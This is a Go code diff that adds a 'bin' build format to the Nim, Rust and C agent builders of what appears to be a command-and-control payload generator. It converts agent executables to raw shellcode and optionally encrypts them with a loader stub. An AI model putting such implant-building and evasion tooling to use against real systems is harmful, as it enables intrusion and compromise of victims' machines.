@@ -1059,6 +1059,20 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 					}
 				}
 			}
+		} else if cfg.Format == "bin" {
+			// nimPath is already an EXE (isDLL=false when format=bin); convert to shellcode
+			if rawPath, err := BuildRAW(nimPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			} else {
+				jsonErr(w, "nim raw build: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
 		} else {
 			result["exe"] = nimPath
 		}
@@ -1097,6 +1111,20 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 						result["stub"] = stubPath
 					}
 				}
+			}
+		} else if cfg.Format == "bin" {
+			// rustPath is already an EXE (isDLL=false when format=bin); convert to shellcode
+			if rawPath, err := BuildRAW(rustPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			} else {
+				jsonErr(w, "rust raw build: "+err.Error(), http.StatusInternalServerError)
+				return
 			}
 		} else {
 			result["exe"] = rustPath
@@ -1137,6 +1165,24 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 						result["stub"] = stubPath
 					}
 				}
+			}
+		} else if cfg.Format == "bin" {
+			cPath, err := BuildCAgentEXE(cfg, payloadsDir)
+			if err != nil {
+				jsonErr(w, "c build: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+			if rawPath, err := BuildRAW(cPath, payloadsDir); err == nil {
+				result["bin"] = rawPath
+				if cfg.Encrypt != "" {
+					if encPath, stubPath, err := EncryptPayload(rawPath, cfg.Encrypt, payloadsDir); err == nil {
+						result["enc"] = encPath
+						result["stub"] = stubPath
+					}
+				}
+			} else {
+				jsonErr(w, "c raw build: "+err.Error(), http.StatusInternalServerError)
+				return
 			}
 		} else {
 			cPath, err := BuildCAgentEXE(cfg, payloadsDir)
